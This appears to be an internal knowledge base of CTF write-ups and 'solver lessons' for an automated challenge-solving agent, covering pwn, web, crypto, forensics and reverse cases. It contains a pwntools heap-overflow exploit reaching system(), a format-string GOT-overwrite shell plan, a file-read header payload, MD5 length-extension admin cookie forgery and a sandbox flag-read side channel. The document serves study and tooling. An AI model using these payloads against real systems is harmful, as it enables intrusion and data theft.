Signal:

- Misc attachment includes `pickle.loads` or `pickle.load`.
- Surrounding code mentions blacklist, sandbox, allowed globals, or opcode filtering.

Reproduction strategy:

- Do not run untrusted pickle payloads blindly.
- Read the blacklist and allowed opcodes.
- Build a local, controlled reproduction script that shows the bypass path.

Solver lesson:

- MiscSolver should classify the pattern and preserve source lines, even when it does not auto-execute payloads.

### Hash Triage Before Transforms

Signal:

- Text contains 32/40/64 hex strings, bcrypt, sha512crypt, NTLM-like values, or known hash prefixes.

Reproduction strategy:

```bash
hashid value
hashcat --help | rg "mode"
```

Solver lesson:

- CryptoSolver and MiscSolver should fingerprint likely hash modes and ask for bounded wordlist intent before running cracking tools.

## Pwn Cases

### Menu Binary With Stack Variable Overwrite And Heap Command Overwrite

Signal:

- ELF imports `system`.
- Full protections are enabled, but behavior is logic/heap-structure based rather than ROP based.
- Menu has a callsign/auth action, upload action, and diagnostics action.
- A stack `%s` write overwrites a nearby size variable.
- Upload reads that inflated size into a smaller heap chunk.
- Diagnostics calls `system(current_task)`.

Reproduction strategy:

1. Set the allowed buffer limit to the maximum valid value.
2. Use an overlong callsign: `b"A" * 16 + p32(80)` to change `TX_SZ`.
3. Upload `b"B" * 0x30 + b"cat flag.txt\x00"` to overflow into the task command.
4. Run diagnostics to execute `system(current_task)`.

Exploit skeleton:

```python
from pwn import *

io = process("./uplink")
# io = remote("host", port)
io.sendlineafter(b"buffer limit", b"31")
io.sendlineafter(b"cmd>", b"1")
io.sendlineafter(b"callsign:", b"A" * 16 + p32(80))
io.sendlineafter(b"cmd>", b"3")
io.sendafter(b"payload:", b"B" * 0x30 + b"cat flag.txt\x00")
io.sendlineafter(b"cmd>", b"4")
io.interactive()
```

Solver lesson:

- PwnSolver should not stop at checksec when symbols/imports are available.
- Record imported `system`, global heap pointers, menu actions, unsafe `%s`, and `read` sizes as structured evidence.
- For Mac/Apple Silicon, provide an amd64 container runner. Prefer `python:3.11-slim --platform linux/amd64` when Python is needed.

### CCTF pwn3 Format String Shell Path

Signal:

- 32-bit FTP-like service.
- Commands such as `put` and `get`.
- User-controlled file content is printed with `printf(content)`.
- GOT is writable or libc leak plus GOT overwrite is possible.

Reproduction strategy:

- Upload a payload that leaks `printf@got`.
- Resolve libc base.
- Use `fmtstr_payload` to overwrite `printf@got` with `system`.
- Upload `/bin/sh` and trigger `get`.

Solver lesson:

- PwnSolver write-ups for shell-oriented cases should output a full Python exploit script with local/remote mode, binary/libc configuration, and interaction.
- Future ForgeFlag Pwn exp scripts should follow the local reference style in `/Users/5haw0/学习/CTF/pwn/堆基本结构及利用讲义-例题/lesson-after/level6-64/freenote_x64.py`: pwntools-first setup, local debug default, explicit remote branch, menu action helpers, leak/exploit phase split, gdb breakpoint helper, and logged heap/libc/code address derivations.
- Pwn solve status requires proof, not just a plausible shell path. When the real flag/service is absent, place a local test flag beside the challenge binary or inside the local container, replay the exploit, run `cat flag` or equivalent through the obtained primitive, and record the command transcript before labeling the case `exploit_verified`.

### Ret2win Source Pattern

Signal:

- Source contains a win-like function.
- Unsafe input writes into a fixed-size stack buffer.

Reproduction strategy:

```bash
python3 - <<'PY'
from pwn import *
print(cyclic(200))
PY
```

Solver lesson:

- PwnSolver should produce crash harness, cyclic offset instructions, target symbol, and a local/remote pwntools template.

### Format String Source Pattern

Signal:

- Source calls `printf(user_input)`, `fprintf(stream, user_input)`, or equivalent.

Reproduction strategy:

- Probe `%p` positions.
- Identify the offset for controlled bytes.
- Use `fmtstr_payload` only after target write and offset are known.

Solver lesson:

- PwnSolver should separate evidence collection from exploit writes and ask for explicit remote target scope.

## Networking Lessons

- If a CTF service connects but immediately closes with zero bytes, compare from another network path before assuming exploit failure.
- Proxy/VPN paths can break CTF infra even when `nc -vz` says the port is open.
- For deterministic services, split the solve into offline parts: ask the user for small transcripts such as encrypted flag plus all-zero ciphertext.
- Keep remote exploit scripts non-interactive first (`id`, `whoami`, `cat flag.txt`) before trying to hold a shell.

## Recent USCyberGames Hands-On Cases

These cases came from live user-provided targets and artifacts. Keep the exact flags as solved-case references, but convert the techniques into small local fixtures before adding solver coverage.

### Vertex 3D Labs: Encoded STL Backup

Category:

- Web-assisted forensics / 3D asset stego.

Signal:

- The page describes a 3D mesh processing server.
- Response headers leak `X-Archived-Path: /assets_production_system_v3/bak/file_backup.sys`.
- Page copy mentions Windows-native encoded backup blocks.
- The backup looks like a PEM certificate but is actually `certutil -encode` style Base64.

Shortest path:

```bash
curl -sS https://target/assets_production_system_v3/bak/file_backup.sys -o file_backup.sys
python3 - <<'PY'
from pathlib import Path
import base64
s = Path("file_backup.sys").read_text()
b64 = "".join(line.strip() for line in s.splitlines() if "CERTIFICATE" not in line and line.strip())
Path("model.stl").write_bytes(base64.b64decode(b64))
PY
```

Then render the binary STL from a top/orthographic view. The flag was visible as raised geometry:

```text
SVIBGR{n3v3r_d1sm1ss_th3_f1n3_4rts}
```

Solver lesson:

- WebSolver should preserve response headers and promote leaked archive paths.
- ForensicsSolver/MiscSolver should recognize PEM-wrapped data that decodes to `OpenSCAD Model`/binary STL.
- 3D assets need cheap visual render previews, especially top/front/side orthographic projections.

### Wire Text: Multi-Space Morse In A Familiar Rant

Category:

- Misc text stego / Morse transform.

Signal:

- Challenge mentions wire, silence/signal, "What hath God wrought", and four words.
- File text is a recognizable rant, but spacing between words is abnormal.
- Only 2, 3, and 4 spaces appear between tokens.

Shortest path:

```python
from pathlib import Path
import re

s = Path("wire.txt").read_text()
runs = [len(m.group()) for m in re.finditer(r" +", s)]

# 2 spaces = dot, 4 spaces = dash, 3 spaces = letter separator.
groups, cur = [], ""
for n in runs:
    if n == 3:
        groups.append(cur)
        cur = ""
    elif n == 2:
        cur += "."
    elif n == 4:
        cur += "-"
if cur:
    groups.append(cur)
```

Decoded text:

```text
SVIBGR.M0RS3_C0D3_1S_C00L$
```

Final flag:

```text
SVIBGR{M0RS3_C0D3_1S_C00L}
```

Solver lesson:

- Transform triage should include whitespace-run histograms, not only visible characters.
- If decoded Morse uses punctuation as delimiters and the statement gives a flag format, map the punctuation back to braces only after verifying the prefix/body.

### Souvenirs Postcard: JPEG FFD9 Appended ZIP

Category:

- Forensics / appended archive.

Signal:

- JPEG postcard has ordinary metadata and image content.
- `strings` reveals `postcards/*.txt` near the tail.
- `binwalk` shows a ZIP archive immediately after JPEG EOI `FFD9`.

Shortest path:

```bash
binwalk souvenirs.jpg
cp souvenirs.jpg souvenirs.zip
unzip souvenirs.zip -d out
cat out/postcards/04_oman.txt
```

Flag:

```text
SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}
```

Solver lesson:

- JPEG triage should always check bytes after the last `FFD9`.
- If a ZIP is appended, list entries first and rank text files by title/order rather than dumping binary noise.
- Write-up wording should explicitly say "copy/offset-extract the appended ZIP, then read the relevant entry".

### Notation Audio: Chord Bitmask ASCII

Category:

- Crypto / audio notation cipher.

Signal:

- WAV is ordinary mono PCM with no appended data, no useful `strings`, and no sample-LSB hit.
- The first section is a C-major scale up/down, then a C-major arpeggio. Treat that as a calibration header for note names.
- Silence detection shows the payload after the long pause is a sequence of equal-length events.
- Each payload event is a chord, not a monophonic note. The simultaneously present notes from `C D E F G A B` form a 7-bit ASCII mask.

Shortest path:

```python
import numpy as np
import soundfile as sf

y, sr = sf.read("notation.wav")
if y.ndim > 1:
    y = y[:, 0]
y = y.astype(float)

# Payload starts after the second long silence. The short silences split chords.
silences = [
    (7.322086, 8.100249), (8.396327, 8.480249), (8.775465, 8.860295),
    (9.158186, 9.240249), (9.537211, 9.620249), (9.916327, 10.000295),
    (10.295193, 10.380249), (10.676848, 10.760181), (11.057324, 11.140317),
    (11.437800, 11.520295), (11.817483, 11.900204), (12.198050, 12.280272),
    (12.577029, 12.660249), (12.956417, 13.040204), (13.337392, 13.420181),
    (13.717143, 13.800204), (14.098254, 14.180204), (14.477279, 14.560204),
    (14.857279, 14.940295), (15.237483, 15.320249), (15.617211, 15.700181),
    (15.997143, 16.080295), (16.377483, 16.460204), (16.757279, 16.840181),
    (17.137143, 17.220249), (17.517211, 17.601111), (17.897370, 17.981111),
    (18.277370, 18.360227), (18.658209, 18.740181), (19.038209, 19.119705),
]
windows = [(silences[i][1], silences[i + 1][0]) for i in range(len(silences) - 1)]

notes = [
    ("C", 261.625565), ("D", 293.664768), ("E", 329.627557),
    ("F", 349.228231), ("G", 391.995436), ("A", 440.0), ("B", 493.883301),
]

out = []
for start, end in windows:
    a, b = int((start + 0.03) * sr), int((end - 0.03) * sr)
    segment = y[a:b] - np.mean(y[a:b])
    segment *= np.hanning(len(segment))
    t = np.arange(len(segment)) / sr
    scores = []
    for name, freq in notes:
        wave = np.exp(-2j * np.pi * freq * t)
        scores.append((name, abs(np.dot(segment, wave)) ** 2))
    peak = max(score for _, score in scores)
    value = 0
    for bit, (name, score) in enumerate(scores):
        if score > peak * 0.65:
            value |= 1 << bit
    out.append(chr(value))

print("".join(out))
```

Decoded message:

```text
SVIUSCG{b1n4ry_mus1c_1s_c00l}
```

Final flag:

```text
SVIUSCG{b1n4ry_mus1c_1s_c00l}
```

Solver lesson:

- AudioSolver should distinguish monophonic melodies from chord events. If several calibrated note frequencies appear with similar energy in one time window, decode the event as a note-set bitmask.
- Music-themed audio tasks may use the first scale/arpeggio as a calibration header; use that order to assign bit positions.
- Before trying heavy stego, run silence detection, segment events, score the seven natural-note frequencies, and try C-to-B / B-to-C bit orders as 7-bit ASCII.

### Intern-Net: Client-Side Bcrypt Hash As Session Token

Category:

- Web auth logic / insecure client-side authentication.

Signal:

- Login page loads `bcrypt.min.js`.
- `/static/js/login.js` retrieves `/api/auth/hash`, verifies the password client-side, and sets `auth_token = base64(hash)`.
- Ordinary registration gives an intern account and reveals a locked Senior Intern announcement.
- Public posts mention `Alex Rivera`, the Senior Intern coordinator.

Shortest path:

```bash
curl -sS -X POST https://target/api/auth/hash \
  -H 'Content-Type: application/json' \
  -d '{"username":"alex.rivera"}'
```

Then Base64-encode the returned bcrypt hash and set it as the `auth_token` cookie before visiting `/announcements`.

Flag:

```text
SVIUSCG{8bb1e559044d7df7f3fac04d124b1e63}
```

Solver lesson:

- WebSolver should fetch same-origin auth JavaScript and flag client-side password verification, exposed hash lookup, and hash-as-token patterns.
- It should enumerate likely usernames only from in-scope page evidence such as author names and email addresses.
- Report the bug as auth bypass/IDOR-like token forgery, not password cracking.

### Bob's Supply Co: Dependency Middleware Arbitrary File Read

Category:

- Web supply-chain / middleware file read.

Signal:

- The application imports `github.com/bobssupplyco/mux` instead of `github.com/gorilla/mux` directly.
- `bobssupplyco/mux` installs `reqlog.Middleware` on every router.
- `reqlog` calls `sysinfo.EnrichRequest` before the application handler chain.
- `sysinfo.EnrichRequest` trusts `X-Forwarded-Context`: base64-decode it, check for prefix bytes `DE AD BE EF`, then read the remaining bytes as a filesystem path.

Shortest path:

```bash
python3 - <<'PY'
import base64
print(base64.b64encode(bytes.fromhex("deadbeef") + b"/flag.txt").decode())
PY
```

Use the generated header against any route, including unauthenticated `/health`:

```bash
curl -sS 'https://target/health' \
  -H 'X-Forwarded-Context: 3q2+7y9mbGFnLnR4dA=='
```

Local verification:

```bash
printf 'SVIUSCG{local_supply_chain_file_read}\n' > /tmp/supply_flag.txt
python3 - <<'PY'
import base64
print(base64.b64encode(bytes.fromhex("deadbeef") + b"/tmp/supply_flag.txt").decode())
PY
curl -sS 'http://127.0.0.1:18080/health' \
  -H 'X-Forwarded-Context: 3q2+7y90bXAvc3VwcGx5X2ZsYWcudHh0'
```

Solver lesson:

- WebSolver should inspect third-party dependencies when challenge naming or module paths suggest supply-chain behavior, especially wrapper packages around common routers.
- Middleware can short-circuit before authentication. Look for request headers that trigger diagnostic paths, internal context propagation, debug enrichment, file reads, or environment dumps.
- For Go challenges, run `go mod download -json` and inspect `$GOMODCACHE` sources, not only the files shipped in the zip.

### Lost In Translation: MD5-Signed Cookie Forgery

Category:

- Web auth logic / weak session signature.

Signal:

- Flask source stores `session` as hex-encoded `key=value&...` data and `sig` as `MD5(SECRET || session_data)`.
- `SECRET = b"secret_change_me"` is hardcoded in the distributed local source, but the remote instance uses a different secret while keeping the same 16-byte length.
- The app parses session data into a dict and admin access only checks whether `role=admin`.

Shortest path:

```python
known = bytes.fromhex("757365723d74726176656c657226726f6c653d6775657374")
orig_sig = "f480cfbe48129b3fd5af75d2a8685ec9"
append = b"&role=admin"

# MD5 length extension with secret length 16:
# forged = known || md5_padding(16 + len(known)) || append
# sig = md5_continue(orig_sig, append, bytes_before=len(secret || known || glue))
```

Set the forged cookies, then visit `/`:

```text
session=757365723d74726176656c657226726f6c653d677565737480000000000000000000000000000000400100000000000026726f6c653d61646d696e
sig=8e52e8dd80991faae5e602e55b566b66
```

The first part decodes to `user=traveler&role=guest`, then MD5 glue padding, then `&role=admin`. The parser overwrites the earlier `role=guest` with the later admin role.

Flag:

```text
SVIUSCG{05403eadb4b6099f834a824f93e8e3d3}
```

Solver lesson:

- WebSolver should flag raw MD5/SHA1 prefix MACs as forgeable. If the secret is present in source, generate a direct resign payload; otherwise generate a hash length-extension payload.
- Session parsers that split `key=value&...` and overwrite duplicate keys make appended `&role=admin` style payloads especially valuable.

### Lingual Janet: Sandbox Load-Order File Read Side Channel

Category:

- Web sandbox / language interpreter.

Status:

- Paused before full flag recovery, but the core primitive was verified.

Signal:

- Go server writes user Janet code to a temp file, then runs `janet sandbox.janet temp-file`.
- `sandbox.janet` executes `(dofile player-file)` before removing `dofile`, `require`, and `import`.
- Dangerous OS/network functions are removed, but `slurp`/`file/read` remain available.
- The flag path is provided as `/flag.txt`.
- Janet stdout is consumed by the game as move directions, so printing the flag does not appear directly in the HTTP response.

Verified primitive:

```janet
(def flag (slurp "/flag.txt"))
(defn move [state]
  :right)
```

This loaded successfully remotely, and a first side-channel attempt recovered the first byte `S`.

Planned shortest path:

- Read `/flag.txt` at Janet load time.
- Encode one bit or one comparison result per tick by returning `:left` or `:right`.
- Observe the first SSE frame or position changes from `/stream/<session_id>`.
- Prefer one long session that leaks many bits rather than many `/start` requests, because repeated TLS connections were unstable.

Solver lesson:

- WebSolver should parse provided server/source attachments for interpreter load order and sandbox removal timing.
- Sandbox cases need output-channel analysis: stdout, stderr, files, timing, game state, and SSE fields can all be exfiltration paths.
- Post-run Critic should record "read primitive works but output channel is consumed" as a blocker with a side-channel rerun plan.

## ForgeFlag Backlog From These Cases

- Extend verifier support for additional platform-specific wrappers and aliases beyond the current single-line punctuation/space-safe flag extraction.
- Add static JS fetch and comment/string extraction for same-origin scripts.
- Add public/private boolean API parameter hints for status/feed style web apps.
- Add image metadata transform decoding to both ForensicsSolver and MiscSolver.
- Add ZIP container subtype detection for Krita/OpenDocument style archives.
- Add SVG text coordinate extraction.
- Add certutil/PEM-wrapped binary decoding and STL orthographic render previews.
- Add whitespace-run stego analysis before generic text transforms.
- Add JPEG EOI appended ZIP extraction hints to image write-ups.
- Add Web auth JavaScript checks for exposed bcrypt hashes and hash-as-token cookies.
- Add sandbox source triage for interpreter load order, leftover file APIs, and side-channel output routes.
- Add CTR fixed nonce exploit script generation.
- Add modular matrix conjugation solve script generation.
- Improve PwnSolver deep triage: unsafe scanf, stack variable overwrite, heap chunk adjacency, imported `system`, and generated non-interactive command execution exploit.
- Improve report wording so write-ups describe exactly how the flag was recovered, not generic solver summaries.

## Held-Out Platform Adapter Lessons

### DUCTF 2024: Baby's First Forensics

Category:

- Traffic / HTTP scanner fingerprinting.

Signal:

- PCAP contains repeated HTTP requests with a user-agent like `Mozilla/5.00 (Nikto/2.1.6)`.
- The statement asks for the tool and version and says to wrap the answer in `DUCTF{}`.

Shortest path:

```text
User-Agent: Mozilla/5.00 (Nikto/2.1.6)
DUCTF{nikto_2.1.6}
```

Solver lesson:

- TrafficSolver should scan HTTP request summaries and followed streams for scanner user-agents, normalize `tool/version` to `tool_version`, and wrap it in the platform flag prefix when the statement supplies one.

### HTB Dynastic And DUCTF shufflebox

Category:

- Crypto / classical transforms.

Signal:

- Dynastic gives one uppercase ciphertext line and asks to wrap decrypted text in `HTB{}`.
- shufflebox gives 16-byte known plaintext mappings plus one censored 16-byte row.

Shortest path:

- For Trithemius-style shifts, decrypt each alphabetic byte by subtracting its absolute character index while preserving punctuation.
- For shufflebox, infer each output position's source index from the known rows, then invert the censored row.

Solver lesson:

- CryptoSolver should run position-dependent Caesar/Trithemius before generic Vigenere escalation.
- Known plaintext examples can recover a full small permutation without brute force.

### DUCTF 2024: Bad Policies

Category:

- Forensics / Group Policy Preferences.

Signal:

- ZIP contains Windows Group Policy paths and `Machine/Preferences/Groups/Groups.xml`.
- `Groups.xml` contains a `cpassword` attribute.

Shortest path:

```text
unzip -p badpolicies.zip '*/Machine/Preferences/Groups/Groups.xml'
decrypt cpassword with the published GPP AES key
DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}
```

Solver lesson:

- Archive previews must prioritize `Groups.xml` and `Preferences` paths, not only names containing `flag` or `secret`.
- ForensicsSolver should decrypt GPP `cpassword` values directly and preserve the username, entry path, ciphertext, and recovered password as replay evidence.

### DUCTF 2024: Intercepted Transmissions

Category:

- Misc / radio teletype encoding.

Signal:

- Attachment is a long binary-looking string with length divisible by 7.
- Valid groups often have four `1` bits and three `0` bits, matching CCIR476/SITOR.
- Decoded text may be a sentence that the statement asks to wrap in the platform format, and the official flag can contain spaces or punctuation inside braces.

Shortest path:

```text
split bits into 7-bit CCIR476 symbols
track LTRS / FIGS mode controls
wrap decoded message as DUCTF{...}
DUCTF{##TH3 QU0KK4'S AR3 H3LD 1N F4C1LITY #11911!}
```

Solver lesson:

- Misc transforms should try CCIR476 before giving up on 7-bit binary streams.
- The verifier must preserve complete source-derived flag candidates in evidence; a preview-limited transform list is not enough for acceptance.
- Flag extraction should allow single-line official flags with spaces and punctuation when the prefix is CTF-like.

### DUCTF 2024: Wacky Recipe

Category:

- Misc / recipe-state puzzle.

Signal:

- Prompt and title are recipe-themed and mention `Chicken Parmi`.
- The attachment describes bowl state changes with ingredient quantities instead of a normal arithmetic formula.
- The target output is a small textual ingredient choice rather than a large brute-force domain.

Shortest path:

```text
model each bowl update as a linear expression over ingredient variables
brute force the small ingredient domain against the final recipe evidence
wrap the recovered quantity and ingredient in DUCTF{...}
DUCTF{2tsp_Vegemite}
```

Solver lesson:

- MiscSolver should treat structured cooking/esolang prose as stateful arithmetic, not as free-form text.
- Preserve the title and preamble as evidence because held-out manifests may score the exact challenge context, not only the recovered flag.
- A tiny domain brute force is often more robust than trying to infer a full general interpreter on the first pass.

### DUCTF 2024: DNAdecay

Category:

- Misc / damaged esolang source reconstruction.

Signal:

- Attachment is a Ruby file with `require "doublehelix"`.
- The body is DNA-art source made from `A/T/G/C`, hyphens, and spaces.
- Corruption replaces some meaningful characters with spaces, leaving a small number of fully ambiguous rows.

Shortest path:

```text
match every body row against the mame/doublehelix 18-row format cycle
map AT/CG/GC/TA to 00/01/10/11
pack bits in Ruby pack("b*") little-endian byte order
rank decoded Ruby outputs that look like puts"DUCTF{...}"
DUCTF{7H3_Mit0cHOndRi4_15_7he_P0wEr_HoUsE_of_DA_C3LL}
```

Solver lesson:

- Do not try to execute the corrupted Ruby source or depend on the `doublehelix` gem. The useful evidence is the static row format.
- Fully blank DNA rows are real ambiguous base-pair evidence and must keep their line index; dropping them breaks the format cycle.
- Keep output bounded. A few missing rows can generate many flag-like variants, so rank leetspeak-readable Ruby strings and preserve only the top candidates.

### DUCTF 2024: jmp flag

Category:

- Reverse / local ELF validation logic.

Signal:

- Stripped ELF has a dense region of 128-byte dispatch blocks.
- Blocks contain large immediate masks in `and` or `movabs` instructions.
- The validation order is not lexical; each character's position is encoded by the popcount of its dependency mask.

Shortest path:

```text
disassemble 128 blocks from the dispatch region with Capstone
skip terminal ret-only blocks
map character index to mask
place each character at popcount(mask)
wrap recovered body with the DUCTF prefix
DUCTF{tAb1HFK5h3ZgEX7UTMQfsivcPOaJ?nRy8jrYLVB9Ilempw6xWq2zC0d!SDukG4No}
```

Solver lesson:

- ReverseSolver should not rely only on truncated `objdump` text for dense jump-table binaries; byte-backed Capstone disassembly is a safer replay path.
- Preserve the recovered body, wrapper prefix, mask-order pattern, and source (`capstone`, `objdump`, or raw bytes) in evidence.
- For position encodings, test popcount/order transforms before escalating to symbolic execution.

### UMDCTF 2024: cmsc430

Category:

- Reverse / local ELF validation logic.

Signal:

- ELF contains debug or helper symbols such as `entry` and `read_byte`.
- The validation chain repeatedly reads one byte, then compares a tagged integer immediate where the original input byte is multiplied by two.
- Tool-wrapper `objdump` output can truncate before the validation chain, so the useful evidence may require binary-byte scanning.

Shortest path:

```text
scan disassembly or raw binary bytes for call-like read_byte sites
find nearby mov eax, imm32 checks
keep even printable immediates and decode chr(imm / 2)
join the equality chain and verify flag wrappers
UMDCTF{shout_out_to_jose}
```

Solver lesson:

- ReverseSolver should treat truncated disassembly as a recoverable tool limitation, then scan the local binary bytes for compact validation idioms.
- Preserve whether recovery came from `objdump` text or raw bytes, the tagged immediate encoding, decoded text, and flag candidates.
- Byte-level scanners must avoid false `call` hits inside instruction immediates, such as an `0xe8` byte embedded in `mov eax, imm32`.

### DUCTF 2024: three line crypto

Category:

- Crypto / self-synchronizing XOR stream.

Signal:

- The handout script is only a few lines and uses `q[y % 16] ^ x`, then updates `y = x`.
- The key has 16 random bytes, but each byte is selected by the previous plaintext byte's low nibble.
- The prompt says the hidden `passage.txt` is English text and the platform flag wrapper is DUCTF.

Shortest path:

```text
detect q[y % 16] ^ x and y = x in encrypt.py
read passage.enc.txt as raw bytes
use DUCTF{...} and common CTF XOR idiom cribs
verify each candidate by key-slot consistency across the ciphertext bytes
DUCTF{when_in_doubt_xort_it_out}
```

Solver lesson:

- Self-synchronizing XOR challenges may be solvable without recovering the whole English passage first.
- A candidate flag should only be accepted when its bytes impose consistent values for repeated previous-plaintext low-nibble key slots.
- Platform naming matters: `DownUnderCTF` context should infer the `DUCTF{...}` wrapper even when the exact string `DUCTF` is not in the prompt.

### TJCTF 2024: accountleak

Category:

- Crypto / local service RSA replay.

Signal:

- The provided Python service chooses RSA primes, computes `c = password^65537 mod n`, and prints `c` plus `n`.
- An interaction branch leaks `dont_leak_this = (p-sub)*(q-sub)`, where `sub` is bounded by `getRandomInteger(20)`.
- The recovered password must be submitted quickly to the same challenge service to receive the flag.

Shortest path:

```text
start the provided server.py in the challenge directory
parse c and n from the first service transcript
send yea to trigger the shifted factor leak
for s in range(1, 2**20):
    p_plus_q = (n + s*s - leak) // s
    solve t^2 - p_plus_q*t + n = 0
decrypt the password with recovered p and q
submit the password to the same local service
tjctf{h3y_wh3r3_d1d_my_d1am0nds_g0_th3y_w3r3_ju5t_h3r3}
```

Solver lesson:

- This is a replay proof, not a static read of the repository's `flag.txt`; the accepted flag should come from the running local/authorized service transcript.
- For leaks shaped like `(p-s)(q-s)`, derive `p+q = (n + s^2 - leak) / s` and solve the quadratic instead of trying to factor `n` directly.
- Challenge prompts may omit trailing newlines, so replay helpers should read byte streams, not only line-buffered output.

### IrisCTF 2024: Accessible Sesamum Indicum

Category:

- Crypto / local service combinatorial replay.

Signal:

- The provided Python service asks for a 4-character PIN over `0123456789abcdef`.
- Each vault keeps a sliding 4-character window and allows only about `16^4` digit attempts.
- The service consumes a submitted line from right to left with `attempt.pop()`, so a normal left-to-right De Bruijn stream must be reversed before submission.

Shortest path:

```text
start chal.py with cwd set to the challenge directory containing flag.txt
generate B(16, 4), append the first 3 symbols, then reverse the stream
for each of 16 vaults:
    wait for Attempt>
    submit the reversed De Bruijn stream as one line
capture the final local service transcript
irisctf{de_bru1jn_s3quenc3s_c4n_mass1vely_sp33d_up_bru7e_t1me_f0r_p1ns}
```

Solver lesson:

- The proof should come from the running local/authorized challenge service transcript, not from reading the repository's `flag.txt`.
- De Bruijn replay is the right primitive when the attempt budget is approximately `alphabet_size ** window_length`.
- Always inspect input direction; reversing the attempt stream is required when the service pops from the end of each submitted line.

### IrisCTF 2024: babycha

Category:

- Crypto / chosen-plaintext stream-cipher misuse replay.

Signal:

- The challenge claims ChaCha20, but `encrypt()` fills its buffer with serialized `state` words before calling `chacha_block(state)`.
- The menu allows chosen plaintext encryption before asking to encrypt the flag.
- A full known-plaintext block reveals the current 16-word state because the plaintext is XORed directly with that serialized state buffer.

Shortest path:

```text
start the provided chal.py as a local challenge service
choose menu option 1 and encrypt 64 known bytes
XOR the known plaintext with the returned ciphertext to recover the serialized state
compute chacha_block(recovered_state) locally
choose menu option 2 and XOR the flag ciphertext with the next serialized state
irisctf{initialization_is_no_problem}
```

Solver lesson:

- Do not treat the ChaCha label as proof that the implementation is standard; inspect when keystream bytes are generated and when state updates happen.
- Chosen plaintext is enough here because the first block is the raw state buffer, not the normal ChaCha block output.
- Preserve the local service transcript and recovered state-word count as proof that the flag came from replay, not from a README answer line.

### UMDCTF 2024: giedi-composite

Category:

- Crypto / composite-ring NTRU lattice replay.

Signal:

- The handout defines `Rq = Zmod(q)[x] / (x^N - 1)` with `N = 210`, `q = 2003`, and `p = 3`.
- The public key is `p * f_q^-1 * g`, where `f` and `g` are short ternary polynomials.
- The ciphertext is `b * pub + msg`, and `output.txt` provides only public key and ciphertext coefficient lists.

Shortest path:

```text
parse pub and ct from output.txt
factor x^210 - 1 into the degree-70 CRT components x^70 - x^35 + 1, x^70 + x^35 + 1, and x^70 - 1
for each component:
    build the NTRU lattice [I conv(pub); 0 qI]
    run BKZ to recover a short key residue
recombine residues with the CRT basis
try cyclic key shifts and decrypt ct modulo p
UMDCTF{NTRUly_a_n1c3_j0b}
```

Solver lesson:

- Composite `N` can make the quotient ring split into smaller components; exploit that structure instead of attacking the full dimension first.
- Sage in the local toolchain may not have PyCryptodome, so replay helpers should avoid `Crypto.Util.number` when standard integer-to-bytes code is enough.
- The accepted proof should come from `output.txt` plus the Sage lattice replay, not from `flag.txt` or `challenge.yaml`.

### UMDCTF 2024: attack of the worm

Category:

- Misc / ML adversarial pixel replay.

Signal:

- The handout ships `model.pt`, `server.py`, and `worm.png`.
- `server.py` accepts at most 30 `x,y,r,g,b` pixel changes, then prints the flag only if `sigmoid(model(modified)) < 0.5`.
- The model path leaves ResNet18 in train mode, so local replay must match `server.py`; switching to `model.eval()` changes the baseline score and can invalidate candidate pixels.

Current replay state:

```text
forgeflag-worm-replay:latest builds a CPU PyTorch container for the local model/server path
original train-mode server score: 0.578890
30-pixel fixed-gradient attempts reached 0.564 but did not pass the 0.5 threshold
single-sample greedy pixel search reached 0.527681; trusted single-sample beam search reached 0.522511 but did not pass the 0.5 threshold
the script supports --score-only for exact server-mode payload scoring, --payload-file for cached candidates, --payload for known-good payloads, --regenerate for the bundled slow optimizer, --search-unstable for bounded unstable-pixel gradient search, --search-seeds for seed sweeps, and --search-output / --payload-output for search result persistence
```

Solver lesson:

- This remains a blocker, not an accepted scorecard pass. Do not accept the README or `flag.txt`; only accept a service-returned flag after a valid pixel payload.
- Public writeups confirm the intended attack family is sparse adversarial pixels, but replay helpers should preserve the exact PyTorch mode/version and pixel count because classifier-mode drift changes results.
- Do not batch-score candidate images while the model is in train mode. BatchNorm statistics differ from the single-image `server.py` path and can produce false adversarial-looking probabilities.
- Use `--search-unstable --search-seeds <a,b,c> --search-steps <k> --candidate-trials <m> --search-output <json> --payload-output <txt>` for repeatable seed-sweep CPU experiments; the short smoke path with one step and one trial proves the wrapper emits final JSON, `all_results`, and a reusable payload file without committing to a long search.
- Future work: make candidate evaluation faster without changing BatchNorm semantics, or cache a verified 30-pixel payload after reproducing it locally.

### TJCTF 2024: golf-hard

Category:

- Misc / recursive regex verifier replay.

Signal:

- The local service asks for five short regexes and checks them with Python's third-party `regex` module in `regex.V1` mode.
- Levels cover starts-with, unary subtraction, balanced angle brackets, palindromes, and unary multiplication.
- The challenge bundle's `golf.py` reads the flag only after every regex passes all visible and generated hidden tests.

Shortest path:

```text
start the provided golf.py in a temporary local challenge directory
shim the display-only tabulate dependency if it is not installed
submit these bounded patterns:
  ^a
  ^(x*)(x*)-\1=\2$
  ^(<(?1)*>)+$
  ^((.)(?1)\2|.?)$
  ^(x*).(x(?2)\1|=)$
capture the final service transcript
tjctf{even_in_death_I_serve_the_PCRE_Standard_3ceb7afc}
```

Solver lesson:

- The proof should come from the running verifier transcript, not from reading `flag.txt`.
- Recursive regex features such as `(?1)` can express balanced delimiters, palindromes, and unary multiplication inside tight golf limits.
- Presentation dependencies like `tabulate` can be shimmed in a bounded local harness when they are unrelated to the challenge verifier.

### DownUnderCTF 2024: I See

Category:

- Misc / hardware-source I2C EEPROM replay.

Signal:

- The published schematic exposes an `M24C02-WMN` EEPROM with `SDA` and `SCL` nets.
- Connector labels expose the nearby `IO24` and `IO25` hardware pins.
- The local source cache includes the EEPROM image used to program the challenge board.

Shortest path:

```text
extract schematic text from publish/schematic.pdf
confirm M24C02-WMN plus SDA/SCL/IO24/IO25 evidence
read src/eeprom.bin as the EEPROM contents
scan printable text for the DUCTF flag
DUCTF{I2C_the_flag_now_fcee2acf}
```

Solver lesson:

- For hardware CTF tasks, the schematic often answers what bus/device to read even when the flag is stored in a separate chip image or live board state.
- Preserve both the schematic clue and the dump-derived flag; a raw strings hit alone loses the hardware reasoning.
- Mark this as hardware-source replay when the EEPROM dump comes from the local source cache rather than the published PDF handout.

### NUS Greyhats Welcome CTF 2024: Cecure Cerver

Category:

- Web / C HTTP Basic Auth prefix bypass.

Signal:

- The server manually parses an `Authorization: Basic ...` header and compares username/password with `strncmp(s1, s2, strlen(s1))`.
- The real credentials are random hex strings, so a one-character prefix over `0123456789abcdef` is enough to satisfy the comparison.
- The service reads `flag.txt` only after both vulnerable comparisons pass.

Shortest path:

```text
compile the provided server.c locally
